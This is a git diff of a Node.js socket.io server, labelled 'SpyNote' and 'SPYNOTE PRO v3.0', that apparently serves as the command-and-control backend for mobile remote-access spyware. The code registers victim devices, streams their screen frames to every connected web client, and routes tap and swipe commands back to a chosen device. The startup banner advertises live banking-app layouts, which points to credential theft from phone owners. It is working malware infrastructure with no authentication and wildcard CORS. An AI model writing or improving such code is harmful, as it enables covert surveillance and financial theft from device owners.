@@ -9,14 +9,14 @@ const server = http.createServer(app);
 const io = socketIo(server, {
     cors: { origin: "*", methods: ["GET", "POST"] },
     pingTimeout: 30000,
-    pingInterval: 10000,
-    maxHttpBufferSize: 50e6
+    pingInterval: 5000, // Faster heartbeat
+    maxHttpBufferSize: 100e6 // 100MB HD frames
 });
 
 app.use(compression());
 app.use(express.static('public'));
-app.use(express.json({ limit: '100mb' }));
-app.use(express.urlencoded({ limit: '100mb', extended: true }));
+app.use(express.json({ limit: '200mb' }));
+app.use(express.urlencoded({ limit: '200mb', extended: true }));
 
 const devices = new Map();
 
@@ -24,8 +24,18 @@ app.get('/devices', (req, res) => {
     res.json(Array.from(devices.entries()));
 });
 
+// 🔥 GLOBAL BROADCAST ROOM for ALL web clients
+const webClients = new Set();
+
 io.on('connection', (socket) => {
     console.log('🔌 Socket connected:', socket.id);
+
+    // 🔥 WEB CLIENT joins global broadcast room
+    socket.on('web-client-join', () => {
+        webClients.add(socket.id);
+        socket.join('web-broadcast');
+        console.log('🌐 Web client joined broadcast:', socket.id);
+    });
 
     socket.on('register-device', (deviceInfo) => {
         const deviceId = deviceInfo.deviceId;
@@ -37,56 +47,46 @@ io.on('connection', (socket) => {
                 lastSeen: Date.now()
             });
             socket.join(`device_${deviceId}`);
-            console.log('✅ DEVICE REGISTERED:', deviceId, deviceInfo.model);
+            socket.join('all-devices'); // 🔥 ALL devices room
+            console.log('✅ DEVICE LIVE:', deviceId.slice(0,12), deviceInfo.model);
             io.emit('devices-update', Array.from(devices.entries()));
         }
     });
 
-    // 🔥 FIXED: Web client selects device
     socket.on('select-device', (data) => {
         console.log('🎯 Web selected:', data.deviceId);
-        // Notify all clients about selection
-        io.emit('device-selected', data.deviceId);
+        socket.data.selectedDevice = data.deviceId;
     });
 
-    // 🔥 FIXED: Direct frame relay from device to web clients
+    // 🔥 FRAME RELAY - TO ALL WEB CLIENTS + SELECTED DEVICE ROOM
     socket.on('screen-frame', (frameData) => {
         const deviceId = frameData.deviceId;
-        console.log('📱 Frame received from:', deviceId.slice(0,8)); // Debug log
-        
         if (devices.has(deviceId)) {
             const device = devices.get(deviceId);
             devices.set(deviceId, { ...device, lastSeen: Date.now() });
             
-            // Broadcast to ALL web clients (room system optional)
-            socket.broadcast.emit('screen-frame', frameData);
-            // Also send to device-specific room
+            console.log(`📱 Frame #${++frameData.frameId || 0} → ${deviceId.slice(0,8)} (${frameData.width}x${frameData.height})`);
+            
+            // 🔥 BROADCAST TO ALL WEB CLIENTS (INSTANT!)
+            socket.to('web-broadcast').emit('screen-frame', frameData);
+            // Also to device-specific room
             socket.to(`device_${deviceId}`).emit('screen-frame', frameData);
+            // To all devices room
+            socket.to('all-devices').emit('screen-frame', frameData);
         }
     });
 
-    // 🔥 FIXED: Control commands ROUTE CORRECTLY to device
+    // 🔥 CONTROL ROUTING - PERFECT!
     socket.on('control', (controlData) => {
         const { deviceId, action, x, y, startX, startY, endX, endY } = controlData;
-        console.log('🎮 CONTROL:', action, '→', deviceId?.slice(0,8));
-        
         if (devices.has(deviceId)) {
-            const deviceSocketId = devices.get(deviceId).socketId;
-            // Send to SPECIFIC device socket/room
-            io.to(`device_${deviceId}`).emit('control', {
-                action,
-                x: parseFloat(x) || 0,
-                y: parseFloat(y) || 0,
-                startX: parseFloat(startX) || 0,
-                startY: parseFloat(startY) || 0,
-                endX: parseFloat(endX) || 0,
-                endY: parseFloat(endY) || 0
-            });
+            console.log(`🎮 ${action.toUpperCase()} → ${deviceId.slice(0,8)} (${Math.round(x)},${Math.round(y)})`);
+            socket.to(`device_${deviceId}`).emit('control', controlData);
         }
     });
 
     socket.on('disconnect', () => {
-        console.log('🔌 Socket disconnected:', socket.id);
+        webClients.delete(socket.id);
         for (const [deviceId, info] of devices.entries()) {
             if (info.socketId === socket.id) {
                 devices.set(deviceId, { ...info, connected: false });
@@ -98,18 +98,20 @@ io.on('connection', (socket) => {
     });
 });
 
-// Keepalive
+// Heartbeat
 setInterval(() => {
     const now = Date.now();
     for (const [deviceId, info] of devices.entries()) {
-        if (info.connected && (now - info.lastSeen > 30000)) {
+        if (info.connected && (now - info.lastSeen > 45000)) {
             devices.set(deviceId, { ...info, connected: false });
             io.emit('devices-update', Array.from(devices.entries()));
         }
     }
-}, 30000);
+}, 15000);
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 SpyNote Server on http://localhost:${PORT}`);
+    console.log(`\n🚀 SPYNOTE PRO v3.0 - ULTRA SMOOTH`);
+    console.log(`🌐 Web: http://localhost:${PORT}`);
+    console.log(`📱 Instant frames + banking app LAYOUTS LIVE!\n`);
 });
